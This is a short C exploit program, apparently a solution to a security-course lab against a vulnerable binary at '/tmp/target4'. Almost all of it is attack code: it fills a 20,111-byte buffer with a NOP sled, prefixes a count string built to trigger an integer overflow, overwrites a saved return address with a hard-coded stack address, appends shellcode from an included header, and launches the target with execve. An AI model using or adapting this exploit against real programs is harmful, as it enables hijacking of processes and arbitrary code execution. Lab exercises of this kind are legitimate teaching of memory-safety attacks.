#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

#define NOP 0x90
//size tencount "2147483648"

#define len 20111

char payload[len];

void make_payload(){
  int i = 0;
  for(i = 0; i < len; i++)
    payload[i] = NOP;

  
  //size ten
  char *count = "2147484653,";

  strncpy(payload, count, 11);

  //Buf 256 bytes
  //EBP 4   bytes
  //Want to Send to Address: 0xbffffc74
  payload[20015] = 0xd8;
  payload[20016] = 0xaf;
  payload[20017] = 0xff;
  payload[20018] = 0xbf;

  strncpy(payload+20019, shellcode, 45);

  payload[len-1] = 0x00;
}

int main(void) {
  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  make_payload();

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


